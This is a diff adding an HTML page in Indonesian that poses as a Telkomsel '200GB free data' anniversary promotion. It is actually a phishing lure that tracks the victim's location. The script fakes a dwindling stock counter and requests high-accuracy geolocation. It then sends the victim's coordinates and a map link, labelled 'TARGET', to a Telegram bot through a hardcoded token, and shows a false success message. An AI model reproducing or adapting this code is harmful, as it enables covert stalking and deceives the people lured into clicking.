@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telkomsel Promo 200GB</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(145deg, #ff6b6b, #ee5253);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 { color: #ee5253; font-size: 28px; margin-bottom: 10px; }
+        .badge {
+            background: #feca57;
+            padding: 8px;
+            border-radius: 50px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        .icon { font-size: 70px; margin: 15px 0; }
+        .btn {
+            background: #10ac84;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin: 15px 0;
+        }
+        .btn:hover { background: #0e9e7a; }
+        .loading { display: none; margin: 15px 0; }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ee5253;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .result { display: none; margin-top: 15px; padding: 15px; background: #e8f5e8; border-radius: 10px; }
+        .terms { font-size: 11px; color: #666; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🎉 PROMO 200GB</h1>
+        <div class="badge">🔥 HUT TELKOMSEL KE-30 🔥</div>
+        <div class="icon">📱</div>
+        <div id="stock" style="background:#ff6b6b; color:white; padding:8px; border-radius:10px; margin:10px 0;">⏳ Sisa: 987 / 1000</div>
+        
+        <button class="btn" onclick="startClaim()" id="claimBtn">KLAIM 200GB GRATIS</button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Memverifikasi...</p>
+        </div>
+        
+        <div class="result" id="result">
+            <div id="resultMsg"></div>
+        </div>
+        <div class="terms">*Untuk semua operator. 200GB Kuota Nasional.</div>
+    </div>
+
+    <script>
+        // ===== GANTI INI =====
+        const BOT_TOKEN = '8447717789:AAEHoP_IgrjY2acXXom4uDqWWv4yeptVZvY'; // TOKEN BOT LU
+        
+        // AMBIL DATA DARI URL
+        const url = new URLSearchParams(window.location.search);
+        const userId = url.get('id');      // PASTI ADA
+        const userName = url.get('ref') || 'User';
+        
+        if (!userId) {
+            document.body.innerHTML = '<h2 style="color:white; text-align:center; margin-top:50px;">Link tidak valid</h2>';
+        }
+        
+        // STOCK BERKURANG (PALSU)
+        let stock = 987;
+        setInterval(() => {
+            stock -= Math.floor(Math.random() * 3);
+            if (stock < 800) stock = 987;
+            document.getElementById('stock').innerHTML = `⏳ Sisa: ${stock} / 1000`;
+        }, 4000);
+        
+        function startClaim() {
+            document.getElementById('claimBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => sendLocation(pos),
+                    err => {
+                        alert('Izinkan akses lokasi untuk melanjutkan');
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('claimBtn').style.display = 'block';
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                alert('Browser tidak mendukung');
+                location.reload();
+            }
+        }
+        
+        function sendLocation(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: parseInt(userId),
+                    text: `📍 *TARGET*\n👤 ${userName}\n🆔 ${userId}\n📌 Lat: ${lat}\n📌 Lon: ${lon}\n🗺 https://maps.google.com/?q=${lat},${lon}`,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('result').style.display = 'block';
+                document.getElementById('resultMsg').innerHTML = '<strong style="color:#10ac84;">✅ SUKSES!</strong><br>Paket 200GB dikirim dalam 2x24 jam. Cek SMS.';
+            })
+            .catch(() => {
+                alert('Gagal, coba lagi');
+                location.reload();
+            });
+        }
+    </script>
+</body>
+</html>
